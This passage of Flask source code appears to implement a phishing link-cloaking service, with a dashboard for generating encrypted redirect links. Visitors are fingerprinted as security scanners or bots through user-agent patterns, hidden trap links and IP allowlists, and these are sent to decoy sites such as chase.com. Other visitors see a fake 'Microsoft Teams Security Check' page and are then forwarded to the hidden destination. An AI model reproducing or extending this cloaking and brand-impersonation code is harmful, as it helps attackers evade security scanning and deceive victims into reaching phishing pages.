                <meta name="robots" content="noindex, nofollow">
                <title>Dashboard - {{ username }}</title>
                <script src="https://cdn.tailwindcss.com"></script>
                <style>
                    body { background: linear-gradient(to bottom, #252423, #6264a7); color: #ffffff; }
                    .card { transition: all 0.3s; }
                    .card:hover { transform: translateY(-5px); }
                    .error { color: #f87171; }
                </style>
                <script>
                    function toggleAnalyticsSwitch(urlId, index) {
                        fetch('/toggle_analytics/' + urlId, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ csrf_token: "{{ form.csrf_token._value() }}" })
                        }).then(response => {
                            if (response.ok) {
                                let checkbox = document.getElementById('analytics-toggle-' + index);
                                checkbox.checked = !checkbox.checked;
                            } else {
                                alert('Failed to toggle analytics');
                            }
                        }).catch(error => {
                            console.error('Error toggling analytics:', error);
                            alert('Error toggling analytics');
                        });
                    }
                </script>
            </head>
            <body class="min-h-screen p-4">
                <div class="max-w-7xl mx-auto">
                    <h1 class="text-4xl font-extrabold mb-8 text-center text-white">Welcome, {{ username }}</h1>
                    {% if form.errors %}
                        <p class="error p-4 mb-4 text-center">
                            {% for field, errors in form.errors.items() %}
                                {% for error in errors %}
                                    {{ error }}<br>
                                {% endfor %}
                            {% endfor %}
                        </p>
                    {% endif %}
                    {% if error %}
                        <p class="error p-4 mb-4 text-center">{{ error }}</p>
                    {% endif %}
                    {% if valkey_error %}
                        <p class="error p-4 mb-4 text-center">{{ valkey_error }}</p>
                    {% endif %}
                    <div class="card mb-8">
                        <h2 class="text-2xl font-bold mb-6 text-white">Generate New URL</h2>
                        <p class="text-gray-300 mb-4">Note: Subdomain, Randomstring1, and Randomstring2 can be changed after generation without affecting the redirect.</p>
                        <form method="POST" class="space-y-5 max-w-md mx-auto">
                            {{ form.csrf_token }}
                            <div>
                                <label class="block text-sm font-medium text-white">Subdomain</label>
                                {{ form.subdomain(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition bg-gray-800 text-white border-gray-600") }}
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-white">Randomstring1</label>
                                {{ form.randomstring1(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition bg-gray-800 text-white border-gray-600") }}
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-white">Destination Link</label>
                                {{ form.destination_link(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition bg-gray-800 text-white border-gray-600") }}
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-white">Randomstring2</label>
                                {{ form.randomstring2(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition bg-gray-800 text-white border-gray-600") }}
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-white">Expiry</label>
                                {{ form.expiry(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition bg-gray-800 text-white border-gray-600") }}
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-white">Enable Analytics</label>
                                {{ form.analytics_enabled(class="mt-1 p-3") }}
                            </div>
                            {{ form.submit(class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition") }}
                        </form>
                    </div>
                    <div class="card">
                        <h2 class="text-2xl font-bold mb-6 text-white">URL History</h2>
                        {% if urls %}
                            {% for url in urls %}
                                <div class="card bg-gray-800 p-6 rounded-lg mb-4">
                                    <h3 class="text-xl font-semibold text-white">{{ url.destination }}</h3>
                                    <p class="text-gray-300 break-all"><strong>URL:</strong> <a href="{{ url.url }}" target="_blank" class="text-indigo-400">{{ url.url }}</a></p>
                                    <p class="text-gray-300"><strong>Created:</strong> {{ url.created }}</p>
                                    <p class="text-gray-300"><strong>Expires:</strong> {{ url.expiry }}</p>
                                    <p class="text-gray-300"><strong>Total Clicks:</strong> {{ url.clicks }}</p>
                                    <div class="flex items-center mt-2">
                                        <label class="text-sm font-medium text-white mr-2">Analytics:</label>
                                        <label class="toggle-switch">
                                            <input type="checkbox" id="analytics-toggle-{{ loop.index }}" {% if url.analytics_enabled %}checked{% endif %} onchange="toggleAnalyticsSwitch('{{ url.url_id }}', '{{ loop.index }}')">
                                            <span class="slider"></span>
                                        </label>
                                    </div>
                                    <div class="mt-2 flex space-x-2">
                                        <a href="/delete_url/{{ url.url_id }}" class="bg-red-600 text-white px-4 py-2 rounded-lg hover:bg-red-700" onclick="return confirm('Are you sure you want to delete this URL?')">Delete URL</a>
                                    </div>
                                </div>
                            {% endfor %}
                        {% else %}
                            <p class="text-gray-300">No URLs generated yet.</p>
                        {% endif %}
                    </div>
                </div>
            </body>
            </html
        """, username=username, form=form, urls=urls, error=error, valkey_error=valkey_error)
    except Exception as e:
        logger.error(f"Dashboard error for user {username}: {str(e)}", exc_info=True)
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Internal Server Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                    <p class="text-gray-600">Something went wrong. Please try again later or check server logs.</p>
                </div>
            </body>
            </html
        """), 500

@app.route("/toggle_analytics/<url_id>", methods=["POST"])
@login_required
@csrf.exempt
def toggle_analytics(url_id):
    try:
        username = session['username']
        data = request.get_json()
        if not data or 'csrf_token' not in data:
            logger.warning(f"Missing CSRF token for toggle_analytics: {url_id}")
            return jsonify({"status": "error", "message": "CSRF token required"}), 403
        form = GenerateURLForm(csrf_token=data['csrf_token'])
        if not form.validate_csrf_token(form.csrf_token):
            logger.warning(f"Invalid CSRF token for toggle_analytics: {url_id}")
            return jsonify({"status": "error", "message": "Invalid CSRF token"}), 403
        if valkey_client:
            key = f"user:{username}:url:{url_id}"
            if not valkey_client.exists(key):
                logger.warning(f"URL {url_id} not found for user {username}")
                return jsonify({"status": "error", "message": "URL not found"}), 404
            current = valkey_client.hget(key, "analytics_enabled")
            new_value = "0" if current == "1" else "1"
            valkey_client.hset(key, "analytics_enabled", new_value)
            logger.debug(f"Toggled analytics for URL {url_id} to {new_value}")
            return jsonify({"status": "ok"}), 200
        return jsonify({"status": "error", "message": "Database unavailable"}), 500
    except Exception as e:
        logger.error(f"Error in toggle_analytics: {str(e)}", exc_info=True)
        return jsonify({"status": "error", "message": "Internal server error"}), 500

@app.route("/delete_url/<url_id>", methods=["GET"])
@login_required
def delete_url(url_id):
    try:
        username = session['username']
        if valkey_client:
            key = f"user:{username}:url:{url_id}"
            if not valkey_client.exists(key):
                logger.warning(f"URL {url_id} not found for user {username}")
                abort(404, "URL not found")
            valkey_client.delete(key)
            valkey_client.delete(f"url_payload:{url_id}")
            logger.debug(f"Deleted URL {url_id}")
            return redirect(url_for('dashboard'))
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
                    <p class="text-gray-600">Database unavailable. Unable to delete URL.</p>
                </div>
            </body>
            </html
        """), 500
    except Exception as e:
        logger.error(f"Error in delete_url: {str(e)}", exc_info=True)
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Internal Server Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                    <p class="text-gray-600">Something went wrong. Please try again later or check server logs.</p>
                </div>
            </body>
            </html
        """, error=str(e)), 500

@app.route("/scanner-trap/<token>", methods=["GET"])
@dynamic_rate_limit(base_limit=5, base_per=60)
def scanner_trap(token):
    try:
        ip = request.remote_addr
        logger.debug(f"Scanner trap hit by IP: {ip}, token: {token}")
        if valkey_client:
            valkey_client.setex(f"scanner:{ip}", 3600, "1")
            logger.info(f"Marked IP {ip} as scanner")
        return redirect("https://www.web3.com", code=302)
    except Exception as e:
        logger.error(f"Error in scanner_trap: {str(e)}", exc_info=True)
        return redirect("https://www.web3.com", code=302)

@app.route("/bot-trap/<token>", methods=["GET"])
@dynamic_rate_limit(base_limit=5, base_per=60)
def bot_trap(token):
    try:
        ip = request.remote_addr
        logger.debug(f"Bot trap hit by IP: {ip}, token: {token}")
        if valkey_client:
            valkey_client.hincrby(f"risk_score:{ip}", "score", 50)
            valkey_client.expire(f"risk_score:{ip}", 3600)
            logger.info(f"Increased risk score for IP {ip} due to bot trap")
        return redirect("https://www.chase.com", code=302)
    except Exception as e:
        logger.error(f"Error in bot_trap: {str(e)}", exc_info=True)
        return redirect("https://www.chase.com", code=302)

@app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>", methods=["GET"], subdomain="<username>")
@dynamic_rate_limit(base_limit=5, base_per=60)
def redirect_handler(username, endpoint, encrypted_payload, path_segment):
    try:
        base_domain = get_base_domain()
        logger.debug(f"Redirect handler: username={username}, endpoint={endpoint}, payload={encrypted_payload[:20]}...")
        ip = request.remote_addr
        ua = request.headers.get('User-Agent', '').lower()

        # Validate payload length
        if not encrypted_payload or len(encrypted_payload) < 32:
            logger.warning(f"Invalid payload length: {len(encrypted_payload)}")
            return redirect("https://www.chase.com", code=302)

        # Cookie-based token check
        token = request.cookies.get('bot_check_token')
        is_first_request = False
        if not token and valkey_client:
            token = secrets.token_hex(16)
            valkey_client.setex(f"token:{ip}:{token}", COOKIE_TOKEN_TTL, "1")
            is_first_request = True
            logger.debug(f"Set new cookie token for IP {ip}: {token}")
        elif valkey_client and not valkey_client.exists(f"token:{ip}:{token}"):
            logger.warning(f"Invalid or missing cookie token for IP {ip}")
            return redirect("https://www.chase.com", code=302)

        # Check for scanner
        is_scanner = False
        if valkey_client and valkey_client.exists(f"scanner:{ip}"):
            is_scanner = True
        elif any(re.search(pattern, ua, re.IGNORECASE) for pattern in SCANNER_UA_PATTERNS):
            is_scanner = True
            if valkey_client:
                valkey_client.setex(f"scanner:{ip}", 3600, "1")
        elif valkey_client:
            scanner_ips = valkey_client.smembers(SCANNER_ALLOWLIST_KEY) or []
            try:
                ip_addr = ipaddress.ip_address(ip)
                if any(ip_addr in ipaddress.ip_network(cidr, strict=False) for cidr in scanner_ips):
                    is_scanner = True
                    valkey_client.setex(f"scanner:{ip}", 3600, "1")
            except ValueError:
                pass

        # Generate verify token
        verify_token = secrets.token_hex(16)
        encrypted_payload = urllib.parse.unquote(encrypted_payload)
        url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()

        # Store request data for verification
        if valkey_client:
            valkey_client.hset(f"verify:{verify_token}", mapping={
                "username": username,
                "endpoint": endpoint,
                "encrypted_payload": encrypted_payload,
                "path_segment": path_segment,
                "url_id": url_id,
                "ip": ip,
                "ua": ua,
                "is_scanner": "1" if is_scanner else "0",
                "is_first_request": "1" if is_first_request else "0",
                "cookie_token": token
            })
            valkey_client.expire(f"verify:{verify_token}", VERIFY_TOKEN_TTL)

        # Return loading page
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta http-equiv="refresh" content="3;url={{ verify_url }}">
                <title>Microsoft Teams</title>
                <style>
                    body {
                        margin: 0;
                        padding: 2rem 1rem;
                        background-color: #f3f2f9;
                        font-family: 'Segoe UI', sans-serif;
                        color: #444;
                        display: flex;
                        flex-direction: column;
                        align-items: center;
                        justify-content: center;
                        min-height: 100vh;
                        text-align: center;
                    }
                    h3 {
                        font-size: 1.1rem;
                        font-weight: 500;
                        margin: 0.4rem 0;
                        color: #444;
                    }
                    p {
                        font-size: 0.9rem;
                        font-weight: 400;
                        color: #666;
                        margin: 0.2rem 0 1.5rem;
                    }
                    .loader {
                        width: 26px;
                        height: 26px;
                        border: 3px solid #ddd;
                        border-top: 3px solid #6264a7;
                        border-radius: 50%;
                        animation: spin 1s linear infinite;
                    }
                    @keyframes spin {
                        to { transform: rotate(360deg); }
                    }
                    a {
                        display: none;
                    }
                </style>
            </head>
            <body>
                <h3>Microsoft Teams Security Check</h3>
                <p>We are validating your request with the latest Microsoft Teams security standards.</p>
                <div class="loader"></div>
                <a href="/bot-trap/{{ bot_trap_token }}">trap</a>
            </body>
            </html
        """, verify_url=url_for('verify', token=verify_token), bot_trap_token=secrets.token_hex(16))
    except Exception as e:
        logger.error(f"Error in redirect_handler: {str(e)}", exc_info=True)
        return redirect("https://www.chase.com", code=302)

@app.route("/verify/<token>", methods=["GET"])
@dynamic_rate_limit(base_limit=5, base_per=60)
def verify(token):
    try:
        if not valkey_client or not valkey_client.exists(f"verify:{token}"):
            logger.warning(f"Invalid or expired verify token: {token}")
            return redirect("https://www.chase.com", code=302)

        verify_data = valkey_client.hgetall(f"verify:{token}")
        username = verify_data.get("username")
        endpoint = verify_data.get("endpoint")
        encrypted_payload = verify_data.get("encrypted_payload")
        path_segment = verify_data.get("path_segment")
        url_id = verify_data.get("url_id")
        ip = verify_data.get("ip")
        ua = verify_data.get("ua")
        is_scanner = verify_data.get("is_scanner") == "1"
        is_first_request = verify_data.get("is_first_request") == "1"
        cookie_token = verify_data.get("cookie_token")

        # Random delay
        time.sleep(random.uniform(0.05, 0.2))

        # Analytics tracking
        should_count_click = False
        if valkey_client and not is_scanner:
            analytics_enabled = valkey_client.hget(f"user:{username}:url:{url_id}", "analytics_enabled") == "1"
            if analytics_enabled:
                click_key = f"click:{ip}:{ua}:{url_id}"
                if not valkey_client.exists(click_key):
                    valkey_client.setex(click_key, 600, "1")
                    should_count_click = True
                    time.sleep(1.0)  # Reduced delay

        # Process payload
        uuid_suffix_pattern = r'(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}[0-9a-f]+)?$'
        cleaned_path_segment = re.sub(uuid_suffix_pattern, '', path_segment)

        payload = None
        if valkey_client:
            cached_payload = valkey_client.get(f"url_payload:{url_id}")
            if cached_payload:
                payload = cached_payload

        if not payload:
            try:
                payload = decrypt_payload(encrypted_payload)
                if valkey_client:
                    expiry = json.loads(payload).get('expiry', int(time.time()) + 3600)
                    ttl = max(1, int(expiry - time.time()))
                    valkey_client.setex(f"url_payload:{url_id}", ttl, payload)
            except ValueError as e:
                logger.error(f"Decryption failed: {str(e)}", exc_info=True)
                return redirect("https://www.chase.com", code=302)

        try:
            data = json.loads(payload)
            redirect_url = data.get("student_link")
            expiry = data.get("expiry", float('inf'))
            if not redirect_url or not re.match(r"^https?://", redirect_url):
                logger.error(f"Invalid redirect URL: {redirect_url}")
                return redirect("https://www.chase.com", code=302)
            if time.time() > expiry:
                logger.warning("URL expired")
                if valkey_client:
                    valkey_client.delete(f"url_payload:{url_id}")
                return redirect("https://www.chase.com", code=302)
        except json.JSONDecodeError as e:
            logger.error(f"Payload parsing error: {str(e)}", exc_info=True)
            return redirect("https://www.chase.com", code=302)

        # Increment analytics
        if should_count_click and valkey_client:
            valkey_client.hincrby(f"user:{username}:url:{url_id}", "clicks", 1)
            logger.debug(f"Incremented click count for URL {url_id}")

        # Set cookie for first request
        response = make_response(redirect(f"{redirect_url.rstrip('/')}/{cleaned_path_segment.lstrip('/')}", code=302))
        if is_first_request:
            response.set_cookie('bot_check_token', cookie_token, max_age=COOKIE_TOKEN_TTL, secure=True, httponly=True, samesite='Strict')
        logger.info(f"Redirecting to {redirect_url.rstrip('/')}/{cleaned_path_segment.lstrip('/')}")
        
        if is_scanner:
            return redirect("https://www.web3.com", code=302)
        
        return response
    except Exception as e:
        logger.error(f"Error in verify: {str(e)}", exc_info=True)
        return redirect("https://www.chase.com", code=302)

@app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>", methods=["GET"])
@dynamic_rate_limit(base_limit=5, base_per=60)
def redirect_handler_no_subdomain(endpoint, encrypted_payload, path_segment):
    try:
        host = request.host
        username = host.split('.')[0] if '.' in host else "default"
        logger.debug(f"Fallback redirect handler: username={username}, endpoint={endpoint}")
        return redirect_handler(username, endpoint, encrypted_payload, path_segment)
    except Exception as e:
        logger.error(f"Error in redirect_handler_no_subdomain: {str(e)}", exc_info=True)
        return redirect("https://www.chase.com", code=302)

@app.route("/favicon.ico")
def favicon():
    return '', 204

@app.route("/<path:path>", methods=["GET"])
def catch_all(path):
    logger.warning(f"404 Not Found for path: {path}, host: {request.host}")
    return render_template_string("""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Not Found</title>
            <script src="https://cdn.tailwindcss.com"></script>
        </head>
        <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
            <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                <h3 class="text-lg font-bold mb-4 text-red-600">Not Found</h3>
                <p class="text-gray-600">The requested URL was not found on the server.</p>
                <p class="text-gray-600">Please check your spelling and try again.</p>
            </div>
        </body>
        </html
    """), 404

@app.route("/update-cidrs", methods=["GET"])
def update_cidrs():
    try:
        fetch_blocked_cidrs()
        update_scanner_allowlist()
        logger.info("Updated CIDRs and scanner allowlist")
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        logger.error(f"Error updating CIDRs: {str(e)}", exc_info=True)
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == "__main__":
    try:
        app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)), debug=False)
    except Exception as e:
        logger.error(f"Error starting Flask app: {str(e)}", exc_info=True)
        sys.exit(1)
